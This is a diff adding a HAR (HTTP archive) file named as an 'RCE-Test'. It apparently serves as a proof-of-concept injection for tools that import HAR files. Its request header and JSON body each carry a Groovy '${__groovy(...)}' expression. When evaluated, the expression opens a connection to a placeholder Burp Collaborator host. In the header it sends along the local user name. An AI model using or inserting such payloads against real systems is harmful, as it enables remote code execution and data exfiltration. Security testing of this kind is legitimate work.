@@ -1,0 +1,22 @@
+{
+  "log": {
+    "version": "1.2",
+    "creator": {"name": "RCE-Test", "version": "1.0"},
+    "entries": [{
+      "request": {
+        "method": "GET",
+        "url": "https://test.com/api",
+        "headers": [
+          {
+            "name": "X-Test",
+            "value": "${__groovy(new java.net.URL('http://YOUR_COLLABORATOR.burpcollaborator.net/' + System.getProperty('user.name')).openConnection().connect(),)}"
+          }
+        ],
+        "postData": {
+          "mimeType": "application/json",
+          "text": "{\"test\":\"${__groovy(new java.net.URL('http://YOUR_COLLABORATOR.burpcollaborator.net/RCE_triggered').openConnection().connect(),)}\"}"
+        }
+      }
+    }]
+  }
+}
